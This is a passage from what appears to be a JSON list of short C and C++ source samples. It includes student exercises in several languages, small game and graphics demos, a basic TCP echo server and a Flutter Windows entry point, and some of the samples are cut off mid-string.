convertToAscii(resized_frame.at<uchar>(i, j), asciiCharacters, reverse);\n\t\t\t}\n\t\t\tascii_frame += \"\\n\";\n\t\t}\n\t\t\n\t\tsystem(\"clear\");\n\t\tcout << ascii_frame << endl;\n\n\t\t// this_thread::sleep_for(chrono::milliseconds(frame_duration));\n\n\t\t// Press  ESC on keyboard to exit\n\t\tchar c = (char)waitKey(25); \n\t\tif (c == 27) { \n\t\t\tbreak; \n\t\t}\n\t}\n\n\treturn 0; \n}\n",
    "#include \"DxLib.h\"\n\nint WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )\n{\n\tint grhandle, pshandle ;\n\tVERTEX2DSHADER Vert[ 6 ] ;\n\n\t// \u30a6\u30a4\u30f3\u30c9\u30a6\u30e2\u30fc\u30c9\u3067\u8d77\u52d5\n\tChangeWindowMode( TRUE );\n\n\t// \u4f7f\u7528\u3059\u308b Direct3D \u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u3092 9EX \u306b\u8a2d\u5b9a\n\tSetUseDirect3DVersion( DX_DIRECT3D_9EX );\n\n\t// \uff24\uff38\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u521d\u671f\u5316\n\tif( DxLib_Init() < 0 ) return -1;\n\n\t// \u753b\u50cf\u306e\u8aad\u307f\u8fbc\u307f\n\tgrhandle = LoadGraph( \"Test1.bmp\" );\n\n\t// \u30d4\u30af\u30bb\u30eb\u30b7\u30a7\u30fc\u30c0\u30fc\u30d0\u30a4\u30ca\u30ea\u30b3\u30fc\u30c9\u306e\u8aad\u307f\u8fbc\u307f\n\tpshandle = LoadPixelShader( \"SamplePS.pso\" ) ;\n\n\t// \u9802\u70b9\u30c7\u30fc\u30bf\u306e\u6e96\u5099\n\tVert[ 0 ].pos = VGet(   0.0f,   0.0f, 0.0f ) ;\n\tVert[ 1 ].pos = VGet( 128.0f,   0.0f, 0.0f ) ;\n\tVert[ 2 ].pos = VGet(   0.0f, 512.0f, 0.0f ) ;\n\tVert[ 3 ].pos = VGet( 128.0f, 512.0f, 0.0f ) ;\n\tVert[ 0 ].dif = GetColorU8( 255,255,255,255 ) ;\n\tVert[ 0 ].spc = GetColorU8( 0,0,0,0 ) ;\n\tVert[ 0 ].u = 0.0f ; Vert[ 0 ].v = 0.0f ;\n\tVert[ 1 ].u = 1.0f ; Vert[ 1 ].v = 0.0f ;\n\tVert[ 2 ].u = 0.0f ; Vert[ 2 ].v = 1.0f ;\n\tVert[ 3 ].u = 1.0f ; Vert[ 3 ].v = 1.0f ;\n\tVert[ 0 ].su = 0.0f ; Vert[ 0 ].sv = 0.0f ;\n\tVert[ 1 ].su = 1.0f ; Vert[ 1 ].sv = 0.0f ;\n\tVert[ 2 ].su = 0.0f ; Vert[ 2 ].sv = 1.0f ;\n\tVert[ 3 ].su = 1.0f ; Vert[ 3 ].sv = 1.0f ;\n\tVert[ 0 ].rhw = 1.0f ;\n\tVert[ 1 ].rhw = 1.0f ;\n\tVert[ 2 ].rhw = 1.0f ;\n\tVert[ 3 ].rhw = 1.0f ;\n\tVert[ 4 ] = Vert[ 2 ] ;\n\tVert[ 5 ] = Vert[ 1 ] ;\n\n\t// \u4f7f\u7528\u3059\u308b\u30c6\u30af\u30b9\u30c1\u30e3\u3092\u30bb\u30c3\u30c8\n\tSetUseTextureToShader( 0, grhandle ) ;\n\n\t// \u4f7f\u7528\u3059\u308b\u30d4\u30af\u30bb\u30eb\u30b7\u30a7\u30fc\u30c0\u30fc\u3092\u30bb\u30c3\u30c8\n\tSetUsePixelShader( pshandle ) ;\n\n\t// \u63cf\u753b\n\tDrawPrimitive2DToShader( Vert, 6, DX_PRIMTYPE_TRIANGLELIST ) ;\n\n\t// \u30ad\u30fc\u5165\u529b\u5f85\u3061\n\tWaitKey() ;\n\n\t// \uff24\uff38\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u5f8c\u59cb\u672b\n\tDxLib_End();\n\n\t// \u30bd\u30d5\u30c8\u306e\u7d42\u4e86\n\treturn 0;\n}\n",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\n\nint  main() {\n\n    string baris;\n\n    // membuka file dalam mode menulis.\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(\"contohfile.txt\");\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\n    //unlimited loop untuk menulis\n    while (true) {\n        cout << \"-\";\n        //mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        //loop akan berhenti jika anda memasukan karakter q\n        if (baris == \"q\") break;\n        // menulis dan memasukan nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n\n    }\n    //selesai dalam menulis sekarang tutup filenya\n    outfile.close();\n\n    //Membuka file dalam mode membaca\n    ifstream infile;\n    //menunjuk ke sebuah file\n    infile.open(\"contohfile.txt\");\n\n\n    cout << endl <<  \">= Membuka dan membaca file \" << endl;\n    //jika file ada maka\n    if (infile.is_open())\n    {\n        //melakukan perulangan setiap baris\n        while (getline(infile, baris))\n        {\n            //dan tampilan di sini\n            cout << baris << '\\n';\n        }\n        //tutup file tersebut setelah selesai\n        infile.close();\n    }\n    //jika tidak ditemukan file maka akan menampilkan ini\n    else cout << \"Unable to open file\";\n    return 0;\n}\n",
    "#include <iostream>\n#include <locale.h>\n\n\nusing namespace std;\n\n//-------------------------------------------------------------------//\n\nvoid MostrarTodoVentas(string nombre[],string productos[],int ventas[][5],int numProductos){\n\tfor(int i = 0; i < 5; i++){\n\t\tfor(int k = 0; k < numProductos; k++){\n\t\t\tcout<<\"La cantidad vendida por la sucursal: \"<<nombre[i]<<\" para el art\u00edculo: \"<<productos[k]<<\n\t\t\t\" es de : \"<<ventas[i][k]<<endl;\t\n\t\t}\n\t\tcout<<endl<<endl;\n\t}\n\tsystem(\"pause\");\t\n}\n\n//-------------------------------------------------------------------//\n\nvoid MostrarTodoStock(string nombre[],string productos[],int stock[][5],int numProductos){\n\tfor(int i = 0; i < 5; i++){\n\t\tfor(int k = 0; k < numProductos; k++){\n\t\t\tcout<<\"La cantidad de stock disponible para la sucursal: \"<<nombre[i]<<\" para el art\u00edculo: \"<<productos[k]<<\n\t\t\t\" es de : \"<<stock[i][k]<<endl;\t\n\t\t}\n\t\tcout<<endl<<endl;\n\t}\n\tsystem(\"pause\");\t\n}\n\n//-------------------------------------------------------------------//\n\nvoid MostrarTodasLasVentasDeLaSucursalDada(string nombre[],string productos[],int ventas[][5],int numProductos){\n\tint sucursal = 0;\n\tbool validar = false;\n\twhile(validar == false){\n\t\tcout<<\"Ingrese la sucursal que desea consultar\\n\";\n\t\tfor(int i = 0; i < 5; i++){\n\t\t\tcout<<i+1<<\")\"<<nombre[i]<<endl;\n\t\t}\n\t\tcin>>sucursal;\t\n\t\tif(sucursal>=1 && sucursal<=5){\n\t\t   validar = true;\n\t\t}else{\n\t\t\tsystem(\"cls\");\n\t\t\tcout<<\"Ingrese una opci\u00f3n v\u00e1lida\\n\";\n\t\t}\n\t}\n\tfor(int i = 0; i < numProductos; i++){\n\t\tcout<<\"La cantidad vendida por la sucursal: \"<<nombre[sucursal-1]<<\" para el art\u00edculo: \"<<productos[i]<<\n\t\t\" es de : \"<<ventas[sucursal-1][i]<<endl;\t\n\t}\n\tsystem(\"pause\");\n}\n\n//-------------------------------------------------------------------//\n\nvoid MostrarTodoElStockDeLaSucursalDada(string nombre[],string productos[],int stock[][5],int numProductos){\n\tint sucursal = 0;\n\tbool validar = false;\n\twhile(validar == false){\n\t\tcout<<\"Ingrese la sucursal que desea consultar\\n\";\n\t\tfor(int i = 0; i < 5; i++){\n\t\t\tcout<<i+1<<\")\"<<nombre[i]<<endl;\n\t\t}\n\t\tcin>>sucursal;\t\n\t\tif(sucursal>=1 && sucursal<=5){\n\t\t   validar = true;\n\t\t}else{\n\t\t\tsystem(\"cls\");\n\t\t\tcout<<\"Ingrese una opci\u00f3n v\u00e1lida\\n\";\n\t\t}\n\t}\n\tfor(int i = 0; i < numProductos; i++){\n\t\tcout<<\"La cantidad de stock por la sucursal: \"<<nombre[sucursal-1]<<\" para el art\u00edculo: \"<<productos[i]<<\n\t\t\" es de : \"<<stock[sucursal-1][i]<<endl;\t\t\n\t}\n\tsystem(\"pause\");\t\n}\n\n//-------------------------------------------------------------------//\n\nvoid MostrarVentasDelArticuloDadoEnLaSucursalDada(string nombre[],string productos[],int ventas[][5],int numProductos){\n\tint sucursal = 0,producto=0;\n\tbool validar = false;\n\twhile(validar == false){\n\t\tcout<<\"Ingrese la sucursal que desea consultar\\n\";\n\t\tfor(int i = 0; i < 5; i++){\n\t\t\tcout<<i+1<<\")\"<<nombre[i]<<endl;\n\t\t}\n\t\tcin>>sucursal;\t\n\t\tif(sucursal>=1 && sucursal<=5){\n\t\t   validar = true;\n\t\t}else{\n\t\t\tsystem(\"cls\");\n\t\t\tcout<<\"Ingrese una opci\u00f3n v\u00e1lida\\n\";\n\t\t}\n\t}\n\t\n\tvalidar = false;\n\twhile(validar == false){\n\t\tcout<<\"Ingrese el producto que desea consultar\\n\";\n\t\tfor(int i = 0; i < numProductos; i++){\n\t\t\tcout<<i+1<<\")\"<<productos[i]<<endl;\n\t\t}\n\t\tcin>>producto;\t\n\t\tif(producto>=1 && producto<=numProductos){\n\t\t   validar = true;\n\t\t}else{\n\t\t\tsystem(\"cls\");\n\t\t\tcout<<\"Ingrese una opci\u00f3n v\u00e1lida\\n\";\n\t\t}\n\t}\n\tcout<<\"La cantidad vendida por la sucursal: \"<<nombre[sucursal-1]<<\" para el art\u00edculo: \"<<productos[producto-1]<<\n\t\" es de : \"<<ventas[sucursal-1][producto-1]<<endl;\n\tsystem(\"pause\");\t\n}\n\n//-------------------------------------------------------------------//\nvoid MostrarStockDelArticuloDadoEnLaSucursalDada(string nombre[],string productos[],int stock[][5],int numProductos){\n\tint sucursal = 0,producto=0;\n\tbool validar = false;\n\twhile(validar == false){\n\t\tcout<<\"Ingrese la sucursal que desea consultar\\n\";\n\t\tfor(int i = 0; i < 5; i++){\n\t\t\tcout<<i+1<<\")\"<<nombre[i]<<endl;\n\t\t}\n\t\tcin>>sucursal;\t\n\t\tif(sucursal>=1 && sucursal<=5){\n\t\t   validar = true;\n\t\t}else{\n\t\t\tsystem(\"cls\");\n\t\t\tcout<<\"Ingrese una opci\u00f3n v\u00e1lida\\n\";\n\t\t}\n\t}\n\t\n\tvalidar = false;\n\twhile(validar == false){\n\t\tcout<<\"Ingrese el producto que desea consultar\\n\";\n\t\tfor(int i = 0; i < numProductos; i++){\n\t\t\tcout<<i+1<<\")\"<<productos[i]<<endl;\n\t\t}\n\t\tcin>>producto;\t\n\t\tif(producto>=1 && producto<=numProductos){\n\t\t   validar = true;\n\t\t}else{\n\t\t\tsystem(\"cls\");\n\t\t\tcout<<\"Ingrese una opci\u00f3n v\u00e1lida\\n\";\n\t\t}\n\t}\n\tcout<<\"La cantidad vendida por la sucursal: \"<<nombre[sucursal-1]<<\" para el art\u00edculo: \"<<productos[producto-1]<<\n\t\" es de : \"<<stock[sucursal-1][producto-1]<<endl;\n\tsystem(\"pause\");\t\n}\n\n//-------------------------------------------------------------------//\n\nvoid RecaudacionTotalSucursal(string nombre[], int precios[], int ventas[][5],int numProductos){\n\tint suma=0;\n\tfor(int i = 0; i < 5; i++){\n\t\tfor(int k = 0; k < numProductos ; k++){\n\t\t\tsuma=suma+(ventas[i][k]*precios[k]);\n\t\t\tif(k==numProductos-1 || numProductos == 0)\n\t\t\t{\n\t\t\t\tcout<<\"La recaudacion total de la sucursal: \"<<nombre[i]<<\" es de: \"<<suma<<\"\\n\";\n\t\t\t\tsuma=0;\n\t\t\t}\n\t\t}\n\t}\n\tsystem(\"pa",
    "#include <Novice.h>\r\n#include <Math.h>\r\n#include <time.h>\r\n#define M_PI 3.14159265358979323846\r\n\r\nconst char kWindowTitle[] = \"GC1D_05_\u30ab\u30f3_\u30b1\u30f3\u30ea\u30e3\u30f3_title\";\r\n\r\nint kWindowWidth = 1280, kWindowHeight = 720;\r\n\r\ntypedef struct Vector2 {\r\n\tfloat X;\r\n\tfloat Y;\r\n}Vector2;\r\n\r\ntypedef struct Camera {\r\n\tVector2 pos;\r\n\tVector2 speed;\r\n}Camera;\r\n\r\ntypedef struct Timer {\r\n\tint time;\r\n\tint clock;\r\n\tint handle;\r\n}Timer;\r\n\r\ntypedef struct Scoreboard{\r\n\tint score;\r\n\tint time;\r\n\tint annko;\r\n\tint annkoScore;\r\n\tint timeAdder;\r\n\tint timeAdderTime;\r\n\tint stoper;\r\n\tint stoperScore;\r\n}Scoreboard;\r\n\r\nint randomOutput;\r\nint randomMaker;\r\nint randomSaver[10];\r\n\r\nenum Direction {\r\n\tleftDown = -4,\r\n\tdown = -3,\r\n\trightDown = -2,\r\n\tleft = -1,\r\n\tstop = 0,\r\n\tright = 1,\r\n\tleftUp = 2,\r\n\tup = 3,\r\n\trightUp = 4\r\n};\r\n\r\nenum Stage {\r\n\ttitle = 1,\r\n\tplay,\r\n\tend\r\n};\r\n\r\ntypedef struct Border {\r\n\tVector2 pos;\r\n\tVector2 worldPos;\r\n\tint height;\r\n\tint width;\r\n\tint wide;\r\n}Border;\r\n\r\ntypedef struct ClearBorder {\r\n\tVector2 pos;\r\n\tint height;\r\n\tint width;\r\n}ClearBorder;\r\n\r\ntypedef struct Player {\r\n\tVector2 pos;\r\n\tVector2 speed;\r\n\tVector2 savePos;\r\n\tVector2 handle;\r\n\tfloat speedPlus;\r\n\tfloat speedDiagonal;\r\n\tfloat speedDash;\r\n\tfloat speedHandle;\r\n\tint energy;\r\n\tint energyHandle;\r\n\tint dashFlat;\r\n\tfloat height;\r\n\tfloat width;\r\n\tfloat rotateSpeed;\r\n\tfloat rotateSpeedBuffer;\r\n\tfloat rotateSpeedHandle;\r\n\tfloat radians;\r\n\tint direction;\r\n}Player;\r\n\r\ntypedef struct PlayerCheckPoint {\r\n\tVector2 pos;\r\n\tVector2 speed;\r\n}PlayerCheckPoint;\r\n\r\ntypedef struct Object {\r\n\tVector2 pos;\r\n\tVector2 worldPos;\r\n\tVector2 speed;\r\n\tfloat speedPlus;\r\n\tfloat speedDiagonal;\r\n\tfloat speedHandle;\r\n\tint radius;\r\n\tint isAlive;\r\n}Object;\r\n\r\nint\ttimeAdderSeachRadius[2];\r\nint stoperSeachRadius[5];\r\n\r\n\r\n//typedef struct Debuffer {\r\n//\tVector pos;\r\n//\tint radius;\r\n//}Enemy;\r\n\r\n\r\n// Windows\u30a2\u30d7\u30ea\u3067\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u30dd\u30a4\u30f3\u30c8(main\u95a2\u6570)\r\nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {\r\n\r\n\t// \u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u521d\u671f\u5316\r\n\tNovice::Initialize(kWindowTitle, kWindowWidth, kWindowHeight);\r\n\r\n\t///===========================================================================================================================================================\r\n\t///\u521d\u671f\u5316\r\n\t///===========================================================================================================================================================\r\n\r\n\t///Camera\r\n\tCamera camera;\r\n\tcamera.pos.X = 0;\r\n\tcamera.pos.Y = 0;\r\n\tcamera.speed.X = 0;\r\n\tcamera.speed.Y = 0;\r\n\r\n\t///Main Timer\r\n\tTimer mainTimer;\r\n\tmainTimer.time = 60;\r\n\tmainTimer.clock = 60;\r\n\tmainTimer.handle = 0;\r\n\r\n\t///Annko Respawn Timer\r\n\tTimer AKRSTimer;\r\n\tAKRSTimer.time = 60;\r\n\tAKRSTimer.clock = 0;\r\n\tAKRSTimer.handle = 0;\r\n\r\n\t///Dash Timer\r\n\tTimer dashTimer;\r\n\tdashTimer.time = 60;\r\n\tdashTimer.clock = 0;\r\n\tdashTimer.handle = 0;\r\n\r\n\t///Stop Timer\r\n\tTimer stopTimer;\r\n\tstopTimer.time = 120;\r\n\tstopTimer.clock = 0;\r\n\tstopTimer.handle = 0;\r\n\r\n\t///stage\r\n\tint stage = 1;\r\n\t\r\n\t///Scoreboard\r\n\tScoreboard score;\r\n\tscore.score = 0;\r\n\tscore.time = 60; \r\n\tscore.annko = 0;\r\n\tscore.annkoScore = 10;\r\n\tscore.timeAdder = 0;\r\n\tscore.timeAdderTime = 2;\r\n\tscore.stoper = 0;\r\n\tscore.stoperScore = 20;\r\n\r\n\t///Border\r\n\tBorder border;\r\n\tborder.height = 5120;\r\n\tborder.width = 5120;\r\n\tborder.wide = 50;\r\n\tborder.worldPos.X = (float)(kWindowWidth / 2 - border.height / 2);\r\n\tborder.worldPos.Y = (float)(kWindowHeight / 2 - border.width / 2);\r\n\tborder.pos.X = 0;\r\n\tborder.pos.Y = 0;\r\n\t\r\n\t\r\n\t///player\r\n\tPlayer player;\r\n\tplayer.pos.X = (float)kWindowWidth / 2;\r\n\tplayer.pos.Y = (float)kWindowHeight / 2;\r\n\t\r\n\tplayer.speed.X = 0;\r\n\tplayer.speed.Y = 0;\r\n\tplayer.speedPlus = 5;\r\n\tplayer.speedDiagonal = (float)(player.speedPlus * sin(0.8));\r\n\tplayer.speedDash = 20;\r\n\tplayer.speedHandle = 5;\r\n\tplayer.energy = 5;\r\n\tplayer.energyHandle = 0;\r\n\tplayer.dashFlat = 0;\r\n\r\n\r\n\tplayer.height = 100;\r\n\tplayer.width = 100;\r\n\r\n\tplayer.savePos.X = -player.width / 2;\r\n\tplayer.savePos.Y = -player.height / 2;\r\n\tplayer.handle.X = -player.width / 2;\r\n\tplayer.handle.Y = -player.height / 2;\r\n\tplayer.rotateSpeed = 1;///degree\r\n\tplayer.rotateSpeedBuffer = 20;\r\n\tplayer.rotateSpeedHandle = 0;\r\n\tplayer.radians = 0.0f;\r\n\tplayer.direction = stop;\r\n\r\n\tPlayerCheckPoint playerCP[24];\r\n\tfor (int i = 0; i < 24; i++) {\r\n\t\tplayerCP[i].speed.X = 0;\r\n\t\tplayerCP[i].speed.Y = 0;\r\n\t}\r\n\r\n\r\n\t///    0  4  5 6  7  8  1\r\n\t///    9               14\r\n\t///    10              15\r\n\t///    11              16\r\n\t///    12              17\r\n\t///    13              18\r\n\t///    2 19 20 21 22 23 3\r\n\t\r\n\t///player\u306e\u56db\u89d2\u3092\u5b9a\u7fa9\u3059\u308b\r\n\tfor (int i = 0; i < 4; i++) {\r\n\t\tplayerCP[i].pos.X = player.width / 2;\r\n\t\tif (i % 2 == 0) {\r\n\t\t\tplayerCP[i].pos.X = -playerCP[i].pos.X;\r\n\t\t}\r\n\t}\r\n\tfor (int i = 0; i < 4; i++) {\r\n\t\tplayerCP[i].pos.Y = player.height / 2;\r\n\t\tif (i < 2) {\r\n\t\t\tplayerCP[i].pos.Y = -playerCP[i].pos.Y;\r\n\t\t}\r\n\t}\r\n\t///\u5f53\u305f\u308a\u5224\u5b9a\u7528\u30dd\u30a4\u30c3\u30c8\r\n\tfor (int i = 4; i < 9; i++) {\r\n\t\tplayerCP[i].pos.X = -player.width / 6 * 3  + player.width / 6 * (i - 3);\r\n\t\tplayerCP[i].pos.Y = -player.height / 2;\r\n\t}\r\n\tfor (int i = 9; i < 14; i++) {\r\n\t\tplayerCP[i]",
    "#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <errno.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/ip.h>\n\nvoid die(const char *msg) {\n    perror(msg);\n    exit(1);\n}\n\nvoid do_something(int conn_fd) {\n    char read_buf[64] = {};\n    int rv = recv(conn_fd, read_buf, sizeof(read_buf) - 1, 0);\n    if (rv < 0) {\n        fprintf(stderr, \"recv error: %d\\n\", rv);\n        return;\n    }\n    printf(\"Client Says: %s\\n\", read_buf);\n    \n    char write_buf[64] = \"world\";\n    write(conn_fd, write_buf, strlen(write_buf));\n\n}\n\nint main() {\n    int fd = socket(AF_INET, SOCK_STREAM, 0);\n\n    if (fd < 0) {\n        die(\"socket error\");\n    }\n    int val = 1;\n    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));\n\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(8080);\n    addr.sin_addr.s_addr = htonl(INADDR_ANY);\n\n    int rv = bind(fd, (struct sockaddr *) &addr, sizeof(addr));\n    if (rv) {\n        die(\"bind()\");\n    }\n    rv = listen(fd, SOMAXCONN);\n    if (rv) {\n        die(\"listen()\");\n    }\n\n    while(1) {\n        struct sockaddr_in client_addr = {};\n        socklen_t client_addr_len = sizeof(client_addr);\n        int conn_fd = accept(fd, (struct sockaddr *) &client_addr, &client_addr_len);\n        if (conn_fd < 0) {\n            continue;\n        }\n        do_something(conn_fd);\n        close(conn_fd);\n    }\n\n}",
    "\ufeff#include <iostream>\n#include <string>\n\nstruct Movie {\n\tstd::string title = \"\u0417\u0430\u043a\u043b\u044f\u0442\u0438\u0435\";\n\tint year = 2013;\n\tstd::string genre = \"\u0423\u0436\u0430\u0441\u044b/\u0414\u0435\u0442\u0435\u043a\u0442\u0438\u0432\";\n\tunsigned int duration = 112;\n\tunsigned int price = 0;\n};\n//\u0417\u0430\u0434\u0430\u0447\u0430 1.\nvoid print_movie(const Movie& M) {\n\tstd::cout << \"1. \u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0444\u0438\u043b\u044c\u043c\u0430: \" << M.title << std::endl;\n\tstd::cout << \"2. \u0413\u043e\u0434 \u0432\u044b\u0445\u043e\u0434\u0430 \u0444\u0438\u043b\u044c\u043c\u0430: \" << M.year << std::endl;\n\tstd::cout << \"3. \u0416\u0430\u043d\u0440 \u0444\u0438\u043b\u044c\u043c\u0430: \" << M.genre << std::endl;\n\tstd::cout << \"4. \u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0444\u0438\u043b\u044c\u043c\u0430: \" << M.duration << \" \u043c\u0438\u043d\u0443\u0442\u044b\" << std::endl;\n\tstd::cout << \"5. \u0426\u0435\u043d\u0430 \u0437\u0430 \u0434\u0438\u0441\u043a: \" << M.price << \" \u0440\u0443\u0431\u043b\u0435\u0439\" << std::endl;\n}\n//\u0417\u0430\u0434\u0430\u0447\u0430 2.\nMovie expensive(Movie arr[], const int length) {\n\tint numb = 0;\n\tint max = arr[0].price;\n\tfor (int i = 0; i < length; i++)\n\t\tif (arr[i].price > max) {\n\t\t\tmax = arr[i].price;\n\t\t\tnumb = i;\n\t\t}\n\treturn arr[numb];\n}\n//\u0417\u0430\u0434\u0430\u0447\u0430 3.\nvoid update_info(Movie& M) {\n\tint select = 0;\n\tstd::cout << \"\u0427\u0442\u043e \u0432\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c? -> \";\n\tstd::cin >> select;\n\tstd::cin.ignore();\n\tswitch (select) {\n\tcase 1: std::cout << \"\u041d\u043e\u0432\u043e\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 -> \";\n\t\tstd::getline(std::cin, M.title); break;\n\tcase 2: std::cout << \"\u041d\u043e\u0432\u0430\u044f \u0434\u0430\u0442\u0430 \u0432\u044b\u0445\u043e\u0434\u0430 -> \";\n\t\tstd::cin >> M.year; break;\n\tcase 3: std::cout << \"\u041d\u043e\u0432\u044b\u0439 \u0436\u0430\u043d\u0440 -> \";\n\t\tstd::getline(std::cin, M.genre); break;\n\tcase 4: std::cout << \"\u041d\u043e\u0432\u043e\u0435 \u0432\u0440\u0435\u043c\u044f -> \";\n\t\tstd::cin >> M.duration; break;\n\tcase 5: std::cout << \"\u041d\u043e\u0432\u0430\u044f \u0446\u0435\u043d\u0430 -> \";\n\t\tstd::cin >> M.price; break;\n\t}\n\tstd::cout << \"\u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0432\u043d\u0435\u0441\u0435\u043d\u044b!\\n\";\n}\nvoid movie_name(Movie arr[], const int length) {\n\tstd::cout << \"\u0412\u0430\u0448\u0438 \u0444\u0438\u043b\u044c\u043c\u044b:\\n\";\n\tfor (int i = 0; i < length; i++)\n\t\tstd::cout << i + 1 << '.' << arr[i].title << std::endl;\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"Russian\");\n\t//\u0417\u0430\u0434\u0430\u0447\u0430 1.\n\tstd::cout << \"\\n\u0417\u0430\u0434\u0430\u0447\u0430 1.\" << std::endl;\n\tMovie M1;\n\tprint_movie(M1);\n\n\t//\u0417\u0430\u0434\u0430\u0447\u0430 2.\n\tstd::cout << \"\\n\u0417\u0430\u0434\u0430\u0447\u0430 2.\" << std::endl;\n\t// \u041a\u0440\u0438\u0441\u0442\u0438\u0430\u043d \u0411\u0435\u0439\u043b \u0438 \u0425\u044c\u044e \u0414\u0436\u0435\u043a\u043c\u0430\u043d. \u0427\u0442\u043e \u0435\u0449\u0435 \u043d\u0430\u0434\u043e?\n\tMovie M2{\n\t\t\"\u041f\u0440\u0435\u0441\u0442\u0438\u0436\",\n\t\t2006,\n\t\t\"\u0422\u0440\u0438\u043b\u043b\u0435\u0440/\u0424\u0430\u043d\u0442\u0430\u0441\u0442\u0438\u043a\u0430/\u0414\u0435\u0442\u0435\u043a\u0442\u0438\u0432\",\n\t\t130,\n\t\t500\n\t};\n\n\tMovie M3{\n\t\t\"\u041e\u0447\u0435\u043d\u044c \u0441\u0442\u0440\u0430\u0448\u043d\u043e\u0435 \u043a\u0438\u043d\u043e 2\",\n\t\t2001,\n\t\t\"\u0423\u0436\u0430\u0441\u044b/\u041a\u043e\u043c\u0435\u0434\u0438\u044f\",\n\t\t83,\n\t\t300\n\t};\n\n\tMovie M4{\n\t\t\"\u041d\u0435 \u0433\u0440\u043e\u0437\u0438 \u042e\u0436\u043d\u043e\u043c\u0443 \u0426\u0435\u043d\u0442\u0440\u0430\u043b\u0443, \u043f\u043e\u043f\u0438\u0432\u0430\u044f \u0441\u043e\u043a \u0443 \u0441\u0435\u0431\u044f \u0432 \u043a\u0432\u0430\u0440\u0442\u0430\u043b\u0435\",\n\t\t1995,\n\t\t\"\u041a\u043e\u043c\u0435\u0434\u0438\u044f/\u041a\u0440\u0438\u043c\u0438\u043d\u0430\u043b\",\n\t\t89,\n\t\t280\n\t};\n\t// \u0428\u0438\u043a\u0430\u0440\u043d\u044b\u0439 \u0444\u0438\u043b\u044c\u043c \u0441 \u041a\u0435\u0432\u0438\u043d\u043e\u043c \u0421\u043f\u0435\u0439\u0441\u0438.\n\tMovie M5{\n\t\t\"\u041f\u043b\u0430\u043d\u0435\u0442\u0430 \u041a\u0430-\u041f\u044d\u043a\u0441\",\n\t\t2001,\n\t\t\"\u0424\u0430\u043d\u0442\u0430\u0441\u0442\u0438\u043a\u0430/\u0414\u0440\u0430\u043c\u0430/\u0414\u0435\u0442\u0435\u043a\u0442\u0438\u0432\",\n\t\t120,\n\t\t600\n\t};\n\n\tconst int size1 = 4;\n\tMovie Base[size1]{ M2, M3, M4, M5 };\n\tprint_movie(expensive(Base, size1));\n\t//\u0417\u0430\u0434\u0430\u0447\u0430 3.\n\tstd::cout << \"\\n\u0417\u0430\u0434\u0430\u0447\u0430 3.\" << std::endl;\n\tmovie_name(Base, size1);\n\tstd::cout << \"\u0412\u044b\u0431\u0438\u0440\u0435\u0442\u0435 \u0444\u0438\u043b\u044c\u043c -> \";\n\tint num;\n\tstd::cin >> num;\n\tstd::cin.ignore();\n\tswitch (num) {\n\tcase 1:print_movie(M2);\n\t\tupdate_info(M2); break;\n\tcase 2:print_movie(M3);\n\t\tupdate_info(M3); break;\n\tcase 3:print_movie(M4);\n\t\tupdate_info(M4); break;\n\tcase 4:print_movie(M5);\n\t\tupdate_info(M5); break;\n\t};\n\n\n\n\n\n\treturn 0;\n}",
    "#include <iostream>\n#include \"Rectangle.h\"\n\nint main() {\n    float length, width;\n\n    // Prompt user for length and width for first rectangle\n    std::cout << \"Enter the length of the first rectangle: \";\n    std::cin >> length;\n\n    std::cout << \"Enter the width of the first rectangle: \";\n    std::cin >> width;\n\n    // Create an instance of Rectangle using the default constructor\n    Rectangle rect1;\n\n    // Set length and width for first rectangle using accessor methods\n    rect1.setLength(length);\n    rect1.setWidth(width);\n\n    // Calculate and output area for first rectangle\n    std::cout << \"Area of the first rectangle: \" << rect1.calculateArea() << std::endl;\n\n    // Prompt user for length and width for second rectangle\n    std::cout << \"Enter the length of the second rectangle: \";\n    std::cin >> length;\n\n    std::cout << \"Enter the width of the second rectangle: \";\n    std::cin >> width;\n\n    // Create another instance of Rectangle using the overloaded constructor\n    Rectangle rect2(length, width);\n\n    // Calculate and output area for second rectangle\n    std::cout << \"Area of the second rectangle: \" << rect2.calculateArea() << std::endl;\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if 